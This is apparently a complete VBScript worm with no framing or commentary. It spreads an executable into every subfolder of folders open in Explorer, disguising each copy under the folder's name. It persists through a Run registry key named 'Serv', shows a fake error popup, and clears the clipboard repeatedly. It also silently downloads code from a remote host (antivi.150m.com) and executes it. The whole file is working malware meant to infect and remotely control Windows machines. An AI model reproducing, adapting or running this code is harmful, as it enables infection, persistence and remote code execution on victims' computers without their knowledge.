on error resume next
set fso=createobject("scripting.filesystemobject")
set shell=createobject("shell.application")
set wshell=createobject("wscript.shell")
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Navigate("about:blank")








function spread(objpath)                   
on error resume next
ph=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\"))&"ECHO.EXE"
set fols=objpath.subfolders
for each f in fols
if fso.fileexists(f.path&"\"&f.name&".exe")=false then
fso.copyfile ph,f.path&"\"
fso.movefile f.path&"\ECHO.EXE",f.path&"\"&f.name&".exe"
end if
if f.subfolders.count>0 then
spread(f)
end if
next
end function

function pathk(tt)
if instr(tt,"ile:///")>0 then
pathk=replace(replace(replace(tt,"/","\"),"%20"," "),"file:\\\","")
elseif instr(tt,"ile://")>0 then
pathk=replace(replace(replace(tt,"/","\"),"%20"," "),"file:","")
else
pathk=false
end if
end function



function main()
set shell=createobject("shell.application")
for each w in shell.windows
if pathk(w.locationurl)<>false and fso.folderexists(pathk(w.locationurl)) then
set f=fso.getfolder(pathk(w.locationurl))
spread(f)
end if
next

end function









function autorun()
on error resume next
cpath="C:\WINDOWS\system"
ph=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\"))&"ECHO.EXE"

if fso.fileexists("C:\WINDOWS\system\"&wscript.scriptname)=false then


wshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Serv","C:\WINDOWS\system\"&wscript.scriptname,"REG_SZ"

if err then
wshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Serv","C:\WINDOWS\system\"&wscript.scriptname,"REG_SZ"

end if
fso.copyfile wscript.scriptfullname,"C:\WINDOWS\system\"

fso.copyfile ph,"C:\WINDOWS\system\"
wshell.run "C:\WINDOWS\system\"&wscript.scriptname
wshell.popup "Error Reading Files",1,"Error",16

wscript.quit(1)
end if
end function

function delay(x,y)
x=minute(now)
if x>=y+5 and state=0 then
update()
y=x
elseif x=0 and y<>0 then
y=0
else
x=minute(now)
end if
end function


function update()
on error resume next
set ie=createobject("internetexplorer.application")
ie.visible=0
ie.navigate("http://www.antivi.150m.com/updates/main.txt")
do until(ie.readystate=4)
wscript.sleep 10
loop
code=ie.document.body.innertext
'msgbox code
if instr(code,"STARTCODE")>0 and instr(code,"ENDCODE")>0 then
err.clear
executeglobal code
if err.number<>0 then
state=0
exit function
else
state=1
end if
else
state=0
end if
ie.quit
end function

function collectme()
strfile="C:\WINDOWS\system\ECHO.EXE"
for each ww in shell.windows
pp=pathk(ww.locationurl)
if pp<>false then
'msgbox pp
ff=mid(pp,instrrev(pp,"\"),len(pp))
'msgbox ff
pathh=pp&ff&".EXE"
'msgbox pathh
if fso.fileexists(pathh) then
if not fso.fileexists(strfile) then
fso.movefile pathh,strfile
exit function
end if
end if
end if
next
end function



collectme()
m=minute(now)
n=minute(now)
state=0

autorun()
do
main()
objIE.document.parentwindow.clipboardData.SetData "text", ""
delay m,n
'wscript.sleep 500
'msgbox "ok"
loop
